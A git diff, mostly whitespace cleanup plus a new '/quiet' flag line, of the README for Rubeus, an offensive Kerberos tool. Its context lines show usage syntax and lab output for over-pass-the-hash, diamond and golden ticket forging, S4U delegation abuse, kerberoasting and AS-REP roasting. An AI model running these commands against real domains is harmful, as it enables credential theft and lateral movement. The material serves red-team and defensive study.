@@ -93,7 +93,7 @@ Rubeus is licensed under the BSD 3-Clause license.
 
         Retrieve a TGT based on a user password/hash, optionally saving to a file or applying to the current logon session or a specific LUID:
             Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/opsec] [/nopac] [/proxyurl:https://KDC_PROXY/kdcproxy] [/suppenctype:DES|RC4|AES128|AES256]
-    
+
         Retrieve a TGT based on a user password/hash, start a /netonly process, and to apply the ticket to the new process/logon session:
             Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> /createnetonly:C:\Windows\System32\cmd.exe [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/nowrap] [/opsec] [/nopac] [/proxyurl:https://KDC_PROXY/kdcproxy] [/suppenctype:DES|RC4|AES128|AES256]
 
@@ -172,10 +172,10 @@ Rubeus is licensed under the BSD 3-Clause license.
 
 		Forge a diamond TGT by requesting a TGT based on a user password/hash:
 			Rubeus.exe diamond /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/createnetonly:C:\Windows\System32\cmd.exe] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/krbkey:HASH] [/ticketuser:USERNAME] [/ticketuserid:USER_ID] [/groups:GROUP_IDS] [/sids:EXTRA_SIDS]
-    
+
 		Forge a diamond TGT by requesting a TGT using a PCKS12 certificate:
 			Rubeus.exe diamond /user:USER /certificate:C:\temp\leaked.pfx </password:STOREPASSWORD> [/createnetonly:C:\Windows\System32\cmd.exe] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/krbkey:HASH] [/ticketuser:USERNAME] [/ticketuserid:USER_ID] [/groups:GROUP_IDS] [/sids:EXTRA_SIDS]
-    
+
 		Forge a diamond TGT by requesting a TGT using tgtdeleg:
 			Rubeus.exe diamond /tgtdeleg [/createnetonly:C:\Windows\System32\cmd.exe] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/krbkey:HASH] [/ticketuser:USERNAME] [/ticketuserid:USER_ID] [/groups:GROUP_IDS] [/sids:EXTRA_SIDS]
 
@@ -293,10 +293,12 @@ Rubeus is licensed under the BSD 3-Clause license.
 
         The "/consoleoutfile:C:\FILE.txt" argument redirects all console output to the file specified.
 
+        The "/quiet" argument disables any output of the command
+
         The "/nowrap" flag prevents any base64 ticket blobs from being column wrapped for any function.
 
         The "/debug" flag outputs ASN.1 debugging information.
-		
+
         Convert an AS-REP and a key to a Kirbi:
             Rubeus.exe asrep2kirbi /asrep:<BASE64 | FILEPATH> </key:BASE64 | /keyhex:HEXSTRING> [/enctype:DES|RC4|AES128|AES256] [/ptt] [/luid:X] [/nowrap]
 
@@ -352,7 +354,7 @@ As "everything is stealthy until someone is looking for it", it's arguable wheth
 
 #### Example: Over-pass-the-hash
 
-Say we recover a user's rc4\_hmac hash (NTLM) and want to reuse this credential to compromise an additional machine where the user account has privileged access. 
+Say we recover a user's rc4\_hmac hash (NTLM) and want to reuse this credential to compromise an additional machine where the user account has privileged access.
 
 **Sidenote:** pass-the-hash != over-pass-the-hash. The traditional pass-the-hash technique involves reusing a hash through the NTLMv1/NTLMv2 protocol, which doesn't touch Kerberos at all. The over-pass-the-hash approach was developed by [Benjamin Delpy](https://twitter.com/gentilkiwi) and [Skip Duckwall](https://twitter.com/passingthehash) (see their ["Abusing Microsoft Kerberos - Sorry you guys don't get it"](https://www.slideshare.net/gentilkiwi/abusing-microsoft-kerberos-sorry-you-guys-dont-get-it/18) presentation for more information). This approach turns a hash/key (rc4\_hmac, aes256\_cts\_hmac\_sha1, etc.) for a domain-joined user into a fully-fledged ticket-granting-ticket (TGT).
 
@@ -1235,7 +1237,7 @@ Then the S4U2proxy abuse function (using the ticket from the previous S4U2self p
 
         doIGujCCBragAwIBBaEDAgEWoo..(snip)..
 
-Where `/ticket:X` is the TGT returned in the first step, and `/tgs` is the S4U2self ticket. Injecting the resulting ticket (manually with [Rubeus.exe ptt /ticket:X](#ptt) or by supplying the `/ptt` flag to the **s4u** command) will allow you access the **ldap** service on primary.testlab.local _as if you are dfm.a_. 
+Where `/ticket:X` is the TGT returned in the first step, and `/tgs` is the S4U2self ticket. Injecting the resulting ticket (manually with [Rubeus.exe ptt /ticket:X](#ptt) or by supplying the `/ptt` flag to the **s4u** command) will allow you access the **ldap** service on primary.testlab.local _as if you are dfm.a_.
 
 The `/altservice` parameter takes advantage of [Alberto Solino](https://twitter.com/agsolino)'s great discovery about [how the service name (sname) is not protected in the KRB-CRED file](https://www.coresecurity.com/blog/kerberos-delegation-spns-and-more), only the server name is. This allows us to substitute in any service name we want in the resulting KRB-CRED (.kirbi) file. One or more alternate service names can be supplied, comma separated (`/altservice:cifs,HOST,...`).
 
@@ -1433,7 +1435,7 @@ The `/oldpac` switch can be used to exclude the new *Requestor* and *Attributes*
 
 The `/extendedupndns` switch will include the new extended UpnDns elements. This involved adding _2_ to the Flags, as well as containing the samaccountname and account SID.
 
-The `/rodcNumber:x` parameter was added to perform kerberos [Key List Requests](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/732211ae-4891-40d3-b2b6-85ebd6f5ffff). The value of this parameter is the number specified after krbtgt_x the `msDS-KrbTgtLink` attribute of the read-only domain controller, eg. krbtgt_12345 would be 12345. This request requires certain flags which can be set using `/flags:forwardable,renewable,enc_pa_rep`. The key (`/des:X`, `/rc4:X`, `/aes128:X` or `/aes256:X`) used to encrypt is the KRBTGT_x accounts key. Further information can be found on Elad Shamir's blog post [here](https://posts.specterops.io/at-the-edge-of-tier-zero-the-curious-case-of-the-rodc-ef5f1799ca06), 
+The `/rodcNumber:x` parameter was added to perform kerberos [Key List Requests](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/732211ae-4891-40d3-b2b6-85ebd6f5ffff). The value of this parameter is the number specified after krbtgt_x the `msDS-KrbTgtLink` attribute of the read-only domain controller, eg. krbtgt_12345 would be 12345. This request requires certain flags which can be set using `/flags:forwardable,renewable,enc_pa_rep`. The key (`/des:X`, `/rc4:X`, `/aes128:X` or `/aes256:X`) used to encrypt is the KRBTGT_x accounts key. Further information can be found on Elad Shamir's blog post [here](https://posts.specterops.io/at-the-edge-of-tier-zero-the-curious-case-of-the-rodc-ef5f1799ca06),
 
 Forging a TGT using the `/ldap` flag to retrieve the information and the `/printcmd` flag to print a command to forge another ticket with the same PAC information:
 
@@ -1490,9 +1492,9 @@ Forging a TGT using the `/ldap` flag to retrieve the information and the `/print
           doIFdTCCBXGgAwIBBaEDAgEWooIERDCCBEBhggQ8MIIEOKADAgEFoRgbFlJVQkVVUy5HSE9TVFBBQ0su
                                             ...(snip)...
           dWJldXMuZ2hvc3RwYWNrLmxvY2Fs
-    
-    
-    
+
+
+
     [*] Printing a command to recreate a ticket containing the information used within this ticket
 
     C:\Rubeus\Rubeus.exe golden /aes256:6A8941DCB801E0BF63444B830E5FAABEC24B442118EC60DEF839FD47A10AE3D5 /user:harmj0y /id:1106 /pgid:513 /domain:rubeus.ghostpack.local /sid:S-1-5-21-3237111427-1607930709-3979055039 /pwdlastset:"14/07/2021 02:07:12" /minpassage:1 /logoncount:16 /displayname:"Harm J0y" /netbios:RUBEUS /groups:513 /dc:PDC1.rubeus.ghostpack.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD,NOT_DELEGATED
@@ -1751,7 +1753,7 @@ Forging a service ticket to **cifs/SQL1.rubeus.ghostpack.local** for the user **
     C:\Rubeus>dir \\SQL1.rubeus.ghostpack.local\c$
      Volume in drive \\SQL1.rubeus.ghostpack.local\c$ has no label.
      Volume Serial Number is 1AD6-20BE
-    
+
      Directory of \\SQL1.rubeus.ghostpack.local\c$
 
     15/09/2018  08:19    <DIR>          PerfLogs
@@ -2858,7 +2860,7 @@ Extracting the current user's usable service tickets:
 
      ______        _                      
     (_____ \      | |                     
-     _____) )_   _| |__  _____ _   _  ___ 
+     _____) )_   _| |__  _____ _   _  ___
     |  __  /| | | |  _ \| ___ | | | |/___)
     | |  \ \| |_| | |_) ) ____| |_| |___ |
     |_|   |_|____/|____/|_____)____/(___/
@@ -2913,7 +2915,7 @@ Extracting the current user's usable service tickets:
     AuthenticationPackage    : Negotiate
     LogonType                : Service
     LogonTime                : 2/7/2019 4:51:20 PM
-    LogonServer              : 
+    LogonServer              :
     LogonServerDNSDomain     : testlab.local
     UserPrincipalName        : WINDOWS10$@testlab.local
 
@@ -3170,7 +3172,7 @@ Kerberoasting all users in the current domain using the default `KerberosRequest
     [*] DistinguishedName      : CN=SQL,CN=Users,DC=testlab,DC=local
     [*] ServicePrincipalName   : MSSQLSvc/SQL.testlab.local
     [*] Hash                   : $krb5tgs$23$*$testlab.local$MSSQLSvc/SQL.testlab.local*$E2B3869290...(snip)...
-    
+
     ...(snip)...
 
 
@@ -3459,7 +3461,7 @@ AS-REP roasting all users in the current domain:
 
 
 AS-REP roasting all users in a specific OU, saving the hashes to an output file in Hashcat format:
-    
+
     C:\Rubeus>Rubeus.exe asreproast /ou:OU=TestOU3,OU=TestOU2,OU=TestOU1,DC=testlab,DC=local /format:hashcat /outfile:C:\Temp\hashes.txt
 
      ______        _
@@ -4121,7 +4123,7 @@ If elevated, the `/current` flag will display information for just the current l
 
 ### asrep2kirbi
 
-The **asrep2kirbi** action will convert an AS-REP and a client key to a Kirbi. 
+The **asrep2kirbi** action will convert an AS-REP and a client key to a Kirbi.
 
 The client key can be supplied as a Base64 encoded blob or as a hex string.
 
